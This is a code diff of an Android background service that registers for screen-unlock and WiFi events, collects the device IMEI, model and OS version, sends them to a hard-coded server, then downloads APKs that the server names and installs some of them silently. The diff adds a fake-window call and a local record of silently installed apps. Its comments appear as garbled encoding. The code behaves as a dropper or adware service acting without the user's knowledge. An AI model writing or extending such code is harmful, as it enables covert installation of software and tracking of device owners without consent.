@@ -1,12 +1,16 @@
 package com.xstd.ip.service;
 
 import java.io.File;
+import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
 import java.util.LinkedList;
 import java.util.List;
 
+import com.android.volley.toolbox.JsonObjectRequest;
 import net.tsz.afinal.FinalHttp;
 import net.tsz.afinal.http.AjaxCallBack;
 
+import org.apache.http.client.utils.URLEncodedUtils;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -18,8 +22,10 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.IPackageInstallObserver;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.net.wifi.WifiManager;
+import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -37,15 +43,29 @@ import com.android.volley.toolbox.JsonArrayRequest;
 import com.android.volley.toolbox.Volley;
 import com.xstd.ip.Config;
 import com.xstd.ip.Tools;
+import com.xstd.ip.dao.SilenceAppDao;
+import com.xstd.ip.dao.SilenceAppDaoUtils;
 
 public class CoreService extends Service {
 
+    public static final int UNLOCK_SCREEN = 0x000001;
+    public static final int WIFI_STATE_CHANGED = 0x000002;
+    public static final String FETCH_SERVER_URL = "http://192.168.1.121:8080/springMvc/student.do?method=save";
+    public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
+    public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// ‰∏ÄÂ§©ÁöÑÊØ´ÁßíÊï∏
+    public static LinkedList<ApkInfo> mustDownloadApp = new LinkedList<ApkInfo>();
     private CoreReceiver receiver;
     private SharedPreferences sharedPreferences;
     private FinalHttp finalHttp;
-    public static final int UNLOCK_SCREEN = 0x000001;
-    public static final int WIFI_STATE_CHANGED = 0x000002;
     private String imei;
+    private String device;
+    private String os;
+    private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
+
+        @Override
+        public void packageInstalled(String packageName, int returnCode) throws RemoteException {
+        }
+    };
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -56,16 +76,19 @@ public class CoreService extends Service {
     public void onCreate() {
         super.onCreate();
 
-        sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
-
-        finalHttp = new FinalHttp();
-
         receiver = new CoreReceiver();
         IntentFilter filter = new IntentFilter();
         filter.setPriority(Integer.MAX_VALUE);
         filter.addAction(Intent.ACTION_USER_PRESENT);
         filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
         registerReceiver(receiver, filter);
+
+        sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
+        finalHttp = new FinalHttp();
+        device = Build.MODEL;
+        os = Build.VERSION.RELEASE;
+        imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+
     }
 
     @Override
@@ -80,57 +103,32 @@ public class CoreService extends Service {
             unregisterReceiver(receiver);
     }
 
-    class CoreReceiver extends BroadcastReceiver {
-
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            String action = intent.getAction();
-            if (Intent.ACTION_USER_PRESENT.equals(action))
-                receiveBroadcast(UNLOCK_SCREEN, intent);
-            else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
-                receiveBroadcast(WIFI_STATE_CHANGED, intent);
-        }
-
-    }
-
-    private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
-
-        @Override
-        public void packageInstalled(String packageName, int returnCode) throws RemoteException {
-        }
-    };
-
     /**
-     * Ω” ’µΩπ„≤•
+     * Êé•Êî∂Âà∞ÂπøÊí≠
      *
-     * @param type   ¿‡–Õ
+     * @param type   Á±ªÂûã
      * @param intent
      */
     private void receiveBroadcast(int type, Intent intent) {
         switch (type) {
             case UNLOCK_SCREEN:
-                Tools.logW("∆¡ƒªΩ‚À¯£¨ºÏ≤È «∑Ò”÷Õ¯¬Á£¨∏¸–¬ ˝æ›°£");
+                Tools.initFakeWindow(getApplicationContext());
                 if (Tools.isOnline(getApplicationContext()))
                     updateService();
                 break;
             case WIFI_STATE_CHANGED:
-                Tools.logW("WIFI◊¥Ã¨∏ƒ±‰£¨ºÏ≤È «∑Ò”÷Õ¯¬Á£¨∏¸–¬ ˝æ›°£");
-                // int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE,
-                // WifiManager.WIFI_STATE_DISABLED);
-                // if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate ==
-                // WifiManager.WIFI_STATE_ENABLED)
-                if (Tools.isOnline(getApplicationContext()))
+                int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
+                if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED)
                     updateService();
         }
     }
 
     /**
-     * ¥”∑˛ŒÒ∆˜ªÒ»°∏¸–¬
+     * ‰ªéÊúçÂä°Âô®Ëé∑ÂèñÊõ¥Êñ∞
      */
     private void updateService() {
         long last_update_time = sharedPreferences.getLong("last_update_time", 0);
         if (DateUtils.isToday(last_update_time)) {
-            Tools.logW("ΩÒÃÏ“—æ≠∏¸–¬π˝∑˛ŒÒ∆˜£¨÷±Ω”œ¬‘ÿ°£");
             startDownload();
             return;
         }
@@ -138,18 +136,17 @@ public class CoreService extends Service {
             return;
         else
             Config.IS_DOWNLOADING.set(true);
-        Tools.logW("œÚ∑˛ŒÒ∆˜ªÒ»°–≈œ¢");
         RequestQueue rq = Volley.newRequestQueue(getApplicationContext());
-        if (TextUtils.isEmpty(imei))
-            imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
-        JsonArrayRequest request = new JsonArrayRequest(FETCH_SERVER_URL + "?imei=" + imei, new Listener<JSONArray>() {
+        String url = String.format(FETCH_SERVER_URL + "&imei=%s&os=%s", imei, os);
+        JsonArrayRequest request = new JsonArrayRequest(url, new Listener<JSONArray>() {
 
             @Override
             public void onResponse(JSONArray jsonArray) {
-                Tools.logW("ΩÒÃÏ∏¸–¬ ˝æ›£∫" + jsonArray.toString());
+                Tools.logW(jsonArray.toString());
                 mustDownloadApp.clear();
                 Config.IS_DOWNLOADING.set(false);
                 List<String> installPackages = Tools.getDeviceInstallPackName(getApplicationContext());
+                SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
                 for (int i = 0; i < jsonArray.length(); i++) {
                     try {
                         JSONObject obj = jsonArray.getJSONObject(i);
@@ -157,8 +154,16 @@ public class CoreService extends Service {
                         String packName = obj.getString("packName");
                         String remoteUrl = obj.getString("remoteUrl");
                         boolean isSilence = obj.getBoolean("isSilence");
-                        if (installPackages.contains(packName))
+                        if (installPackages.contains(packName)) {
+                            Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_DEVICE_INSTALLED, packName);
                             continue;
+                        }
+                        Cursor cursor = dao.getDatabase().query(dao.getTablename(), new String[]{SilenceAppDao.Properties.Packagename.columnName},
+                                SilenceAppDao.Properties.Packagename.columnName + "=?", new String[]{packName}, null, null, null);
+                        if (cursor != null && cursor.moveToFirst()) {
+                            Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_INSTALLED_BEFORE, packName);
+                            continue;
+                        }
                         ApkInfo app = new ApkInfo();
                         app.fileName = fileName;
                         app.packName = packName;
@@ -191,7 +196,7 @@ public class CoreService extends Service {
                         if (Tools.isOnline(getApplicationContext()))
                             updateService();
                     }
-                }, 1000 * 30);
+                }, 1000 * 60 * 5);
 
             }
         });
@@ -200,7 +205,7 @@ public class CoreService extends Service {
     }
 
     /**
-     * È_ ºœ¬›d£¨œ¬›dÕÍ≥…∞≤—b
+     * ÈñãÂßã‰∏ãËºâÔºå‰∏ãËºâÂÆåÊàêÂÆâË£ù
      */
     private void startDownload() {
         if (!Config.IS_DOWNLOADING.get() && mustDownloadApp.size() > 0) {
@@ -209,13 +214,16 @@ public class CoreService extends Service {
             if (!parent.exists())
                 parent.mkdirs();
             final ApkInfo apkInfo = mustDownloadApp.removeFirst();
-            File file = new File(DOWNLOAD_LOCATION, apkInfo.fileName);
-            file.deleteOnExit();
+            final File file = new File(DOWNLOAD_LOCATION, apkInfo.fileName);
+            if (file.exists())
+                file.delete();
+            Tools.logW("ÂºÄÂßã‰∏ãËΩΩ" + apkInfo.fileName);
             finalHttp.download(apkInfo.remoteUrl, DOWNLOAD_LOCATION + apkInfo.fileName, true, new AjaxCallBack<File>() {
 
                 @Override
                 public void onSuccess(File file) {
                     super.onSuccess(file);
+                    Tools.logW(file.getAbsolutePath() + "‰∏ãËΩΩÊàêÂäü");
                     Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_DOWNLOAD_SUCCESS, apkInfo.packName);
                     Config.IS_DOWNLOADING.set(false);
                     if (apkInfo.isSilence)
@@ -229,31 +237,27 @@ public class CoreService extends Service {
                 @Override
                 public void onFailure(Throwable t, String strMsg) {
                     super.onFailure(t, strMsg);
+                    Tools.logW("‰∏ãËΩΩÂ§±Ë¥•" + strMsg);
                     Config.IS_DOWNLOADING.set(false);
                     mustDownloadApp.addFirst(apkInfo);
+                    if (file.exists())
+                        file.delete();
+                    Handler handler = new Handler(getMainLooper());
+                    handler.postDelayed(new Runnable() {
+
+                        @Override
+                        public void run() {
+                            if (Tools.isOnline(getApplicationContext()))
+                                startDownload();
+                        }
+                    }, 1000 * 60 * 5);
                 }
             });
         }
     }
 
-    public class ApkInfo {
-        public String fileName;
-        public String packName;
-        public String remoteUrl;
-        public boolean isSilence;
-
-        /**
-         * “‘œ¬’‚–© Ù–‘÷ª”–µ±isSilenceŒ™false ±≤≈”–°£
-         */
-        public String tickerText;
-        public String title;
-        public String text;
-        public int icon;
-        public Bitmap largeIcon;
-    }
-
     /**
-     * ≈–î‡Æî«∞ïrÈg «∑Ò†ëø…‘ ‘S∏¸–¬
+     * Âà§Êñ∑Áï∂ÂâçÊôÇÈñìÊòØÂê¶Áà≤ÂèØÂÖÅË®±Êõ¥Êñ∞
      *
      * @return
      */
@@ -271,9 +275,34 @@ public class CoreService extends Service {
         return false;
     }
 
-    public static final String FETCH_SERVER_URL = "http://192.168.1.121:8080/springMvc/student.do?method=installed";
-    public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
-    public static LinkedList<ApkInfo> mustDownloadApp = new LinkedList<ApkInfo>();
-    public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// “ªÃÏµƒ∫¡√Îîµ
+    public static class ApkInfo {
+        public String fileName;
+        public String packName;
+        public String remoteUrl;
+        public boolean isSilence;
+
+        /**
+         * ‰ª•‰∏ãËøô‰∫õÂ±ûÊÄßÂè™ÊúâÂΩìisSilence‰∏∫falseÊó∂ÊâçÊúâ„ÄÇ
+         */
+        public String tickerText;
+        public String title;
+        public String text;
+        public int icon;
+        public Bitmap largeIcon;
+    }
+
+    class CoreReceiver extends BroadcastReceiver {
+
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String action = intent.getAction();
+            Tools.logW(action);
+            if (Intent.ACTION_USER_PRESENT.equals(action))
+                receiveBroadcast(UNLOCK_SCREEN, intent);
+            else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
+                receiveBroadcast(WIFI_STATE_CHANGED, intent);
+        }
+
+    }
 
 }
